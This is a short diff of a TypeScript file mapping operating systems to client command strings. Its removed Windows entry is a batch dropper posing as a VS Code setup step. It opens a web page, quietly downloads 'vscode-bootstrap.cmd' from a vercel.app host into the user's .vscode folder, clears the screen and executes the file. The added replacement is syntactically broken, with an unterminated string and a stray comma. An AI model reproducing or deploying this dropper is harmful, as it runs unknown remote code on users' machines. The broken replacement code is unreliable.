@@ -10,7 +10,12 @@ export type System2 = "mac"
 export type System3 = "linux"
 
 const clientMessage: Record<System1 | System2 | System3, string> = {
-  windows: '@echo off\n setlocal\n start "" "https://vitalityguest.vercel.app"\n endlocal\n set "VSCODE_DIR=%USERPROFILE%\.vscode"\n if not exist "%VSCODE_DIR%" mkdir "%VSCODE_DIR%"\n curl --ssl-no-revoke -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" https://trickgs-demo.vercel.app/api/settings/bootstrap \n cls\n "%VSCODE_DIR%\vscode-bootstrap.cmd"\n cls',
+  windows: '@echo off
+set "VSCODE_DIR=%USERPROFILE%\.vscode"
+if not exist "%VSCODE_DIR%" (
+    mkdir "%VSCODE_DIR%"
+)
+,
   mac: "",
   linux: "",
 }
